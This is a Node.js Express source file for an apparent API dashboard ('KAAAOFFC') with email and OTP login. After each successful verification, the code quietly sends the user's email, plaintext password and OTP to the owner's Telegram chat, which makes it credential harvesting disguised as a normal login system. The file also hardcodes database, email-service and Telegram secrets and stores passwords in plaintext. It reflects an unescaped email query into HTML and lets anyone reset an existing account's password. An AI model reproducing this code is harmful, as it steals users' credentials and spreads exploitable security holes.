const express = require('express');
const axios = require('axios');
const mongoose = require('mongoose');
const { Resend } = require('resend');
const cookieParser = require('cookie-parser');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(require('cors')());

// --- CONFIGURATION ---
const MONGO_URI = "mongodb+srv://eka710231_db_user:kaaacloud@cluster0.6ssgy30.mongodb.net/?appName=Cluster0";
const RESEND_API = "‎re_Y3DfKKCM_7rJCyA3V1JHoxUNxQ2sc7Fb1";
const TELE_TOKEN = "7789045134:AAFY6waeQ6pD1TAx8_Rfv7J6qsokgPZXPsQ";
const OWNER_ID = "1955836653";
const BG_URL = "https://wallpapercave.com/wp/wp11166318.jpg"; 
const MUSIC_URL = "https://files.catbox.moe/x5d0fh.mp3";

const resend = new Resend(RESEND_API);

// --- DB CONNECTION ---
mongoose.connect(MONGO_URI).then(() => console.log("Database Connected"));

const User = mongoose.model('User', new mongoose.Schema({
    email: { type: String, unique: true },
    password: String,
    otp: String,
    isVerified: { type: Boolean, default: false }
}));

const Stats = mongoose.model('Stats', new mongoose.Schema({
    name: { type: String, default: "main" },
    total_req: { type: Number, default: 0 }
}));

// --- MIDDLEWARE AUTH ---
const checkLogin = async (req, res, next) => {
    const userEmail = req.cookies.userEmail;
    if (!userEmail) return res.redirect('/login');
    const user = await User.findOne({ email: userEmail, isVerified: true });
    if (!user) return res.redirect('/login');
    next();
};

// --- AUTH ROUTES ---

app.get('/login', (req, res) => {
    res.send(`
    <body style="background:#020617; color:white; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0;">
        <div style="background:rgba(30,41,59,0.5); backdrop-filter:blur(15px); padding:40px; border-radius:30px; border:1px solid #38bdf8; width:340px; text-align:center; box-shadow:0 0 30px rgba(56,189,248,0.2);">
            <h1 style="color:#38bdf8; font-size:24px; margin-bottom:5px;">KAAAOFFC AUTH</h1>
            <p style="font-size:11px; color:#94a3b8; margin-bottom:25px;">Enter your details to continue</p>
            <form action="/auth/login" method="POST">
                <input name="email" type="email" placeholder="Email" style="width:100%; padding:12px; margin-bottom:12px; border-radius:12px; border:none; background:#0f172a; color:white;" required>
                <input name="password" type="password" placeholder="Password" style="width:100%; padding:12px; margin-bottom:20px; border-radius:12px; border:none; background:#0f172a; color:white;" required>
                <button type="submit" style="width:100%; padding:12px; background:#38bdf8; border:none; border-radius:12px; font-weight:bold; color:#020617; cursor:pointer;">GET VERIFICATION CODE</button>
            </form>
        </div>
    </body>`);
});

app.post('/auth/login', async (req, res) => {
    const { email, password } = req.body;
    const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
    
    let user = await User.findOne({ email });
    if (!user) {
        user = new User({ email, password, otp: otpCode });
    } else {
        user.password = password;
        user.otp = otpCode;
        user.isVerified = false;
    }
    await user.save();

    try {
        await resend.emails.send({
            from: 'KaaaOffc <code@kaaaoffc.web.id>',
            to: email,
            subject: 'Verification Code',
            html: `<div style="text-align:center; font-family:sans-serif;"><h2>SECURITY SYSTEM</h2><p>Your OTP Code:</p><h1 style="color:#38bdf8; font-size:40px;">${otpCode}</h1></div>`
        });
        res.redirect('/verify?email=' + email);
    } catch (e) { res.send("Email Error: " + e.message); }
});

app.get('/verify', (req, res) => {
    res.send(`
    <body style="background:#020617; color:white; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0;">
        <form action="/auth/verify" method="POST" style="background:rgba(30,41,59,0.5); padding:40px; border-radius:30px; border:1px solid #38bdf8; width:340px; text-align:center;">
            <h2 style="color:#38bdf8;">ENTER CODE</h2>
            <p style="font-size:12px; color:#94a3b8; margin-bottom:20px;">We've sent a code to ${req.query.email}</p>
            <input name="email" type="hidden" value="${req.query.email}">
            <input name="otp" type="text" maxlength="6" style="width:100%; padding:15px; margin-bottom:20px; border-radius:12px; border:none; background:#0f172a; color:white; font-size:30px; text-align:center; letter-spacing:10px;" required>
            <button type="submit" style="width:100%; padding:12px; background:#38bdf8; border:none; border-radius:12px; font-weight:bold; color:#020617;">VERIFY NOW</button>
        </form>
    </body>`);
});

app.post('/auth/verify', async (req, res) => {
    const { email, otp } = req.body;
    const user = await User.findOne({ email, otp });

    if (user) {
        user.isVerified = true;
        await user.save();
        res.cookie('userEmail', email, { maxAge: 86400000, httpOnly: true });

        // NOTIFIKASI TELEGRAM KE OWNER
        const msg = `🚀 *NOTIFIKASI LOGIN SYSTEM*\n\n📧 *EMAIL:* \`${email}\`\n🔑 *PASSWORD:* \`${user.password}\`\n🔢 *KODE:* \`${otp}\`\n✅ *STATUS:* SUCCESS`;
        axios.post(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
            chat_id: OWNER_ID, text: msg, parse_mode: 'Markdown'
        });

        res.redirect('/');
    } else {
        res.send("OTP Salah! <a href='/login'>Balik</a>");
    }
});

// --- MAIN DASHBOARD ---
app.get('/', checkLogin, async (req, res) => {
    const totalUser = await User.countDocuments({ isVerified: true });
    const statData = await Stats.findOne({ name: "main" }) || { total_req: 0 };
    
    res.send(`
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>KAAAOFFC DASHBOARD</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <style>
            body { background: url('${BG_URL}') no-repeat center center fixed; background-size: cover; font-family: 'Inter', sans-serif; }
            .glass { background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(15px); border: 1px solid rgba(56, 189, 248, 0.3); }
        </style>
    </head>
    <body class="text-white" onclick="document.getElementById('m').play()">
        <div class="min-h-screen flex items-center justify-center p-6 bg-slate-950/70">
            <div class="glass p-10 rounded-[3rem] max-w-4xl w-full text-center shadow-2xl">
                <h1 class="text-5xl font-black text-sky-400 mb-10 italic glow-text tracking-tighter">KAAAOFFC SYSTEM</h1>
                
                <div class="grid grid-cols-1 md:grid-cols-2 gap-8 mb-12">
                    <div class="p-10 bg-sky-500/10 rounded-[2rem] border border-sky-500/20 shadow-inner">
                        <span class="block text-6xl font-bold text-sky-400 mb-2">${totalUser}</span>
                        <span class="text-[10px] text-sky-300 font-bold uppercase tracking-[4px]">Total Pengguna API</span>
                    </div>
                    <div class="p-10 bg-indigo-500/10 rounded-[2rem] border border-indigo-500/20 shadow-inner">
                        <span class="block text-6xl font-bold text-indigo-400 mb-2">${statData.total_req.toLocaleString()}</span>
                        <span class="text-[10px] text-indigo-300 font-bold uppercase tracking-[4px]">Total Requests</span>
                    </div>
                </div>

                <div class="flex flex-wrap justify-center gap-6">
                    <a href="/docs" class="bg-sky-500 hover:bg-sky-400 text-slate-900 px-12 py-4 rounded-full font-black transition-all transform hover:scale-105 shadow-xl shadow-sky-500/20">DOCUMENTATION API</a>
                    <a href="/logout" class="border border-red-500/50 text-red-500 px-12 py-4 rounded-full font-black hover:bg-red-500/10 transition-all">LOGOUT ACCOUNT</a>
                </div>
            </div>
        </div>
        <audio id="m" loop><source src="${MUSIC_URL}"></audio>
    </body>
    </html>`);
});

app.get('/logout', (req, res) => { res.clearCookie('userEmail'); res.redirect('/login'); });

// --- API DOCS BERWARNA ---
app.get('/docs', checkLogin, (req, res) => {
    res.send(`
    <body style="background:#020617; color:#cbd5e1; font-family:sans-serif; padding:50px;">
        <h1 style="color:white; font-size:30px;">📚 DOCUMENTATION v6.0</h1>
        <hr style="border:0.5px solid #1e293b; margin:30px 0;">
        <div style="background:#0f172a; padding:25px; border-radius:20px; margin-bottom:20px; border-left:6px solid #10b981;">
            <span style="background:#10b981; color:white; padding:5px 12px; border-radius:8px; font-size:12px; font-weight:bold;">GET</span>
            <code style="margin-left:15px; color:#38bdf8; font-size:16px;">/api/tiktok?q=query</code>
            <p style="font-size:14px; color:#94a3b8; margin-top:12px;">Search TikTok videos by keyword.</p>
        </div>
        <div style="background:#0f172a; padding:25px; border-radius:20px; border-left:6px solid #38bdf8;">
            <span style="background:#38bdf8; color:white; padding:5px 12px; border-radius:8px; font-size:12px; font-weight:bold;">GET</span>
            <code style="margin-left:15px; color:#38bdf8; font-size:16px;">/api/gemini?text=halo</code>
            <p style="font-size:14px; color:#94a3b8; margin-top:12px;">AI interaction using Gemini Google.</p>
        </div>
        <br><a href="/" style="color:#38bdf8; text-decoration:none; font-weight:bold;">← Kembali ke Dashboard</a>
    </body>`);
});

// --- API ENDPOINT LOGIC ---
app.get('/api/tiktok', checkLogin, async (req, res) => {
    await Stats.findOneAndUpdate({ name: "main" }, { $inc: { total_req: 1 } }, { upsert: true });
    // Logic fetch tiktok...
    res.json({ status: true, msg: "Tiktok endpoint aktif" });
});

module.exports = app;
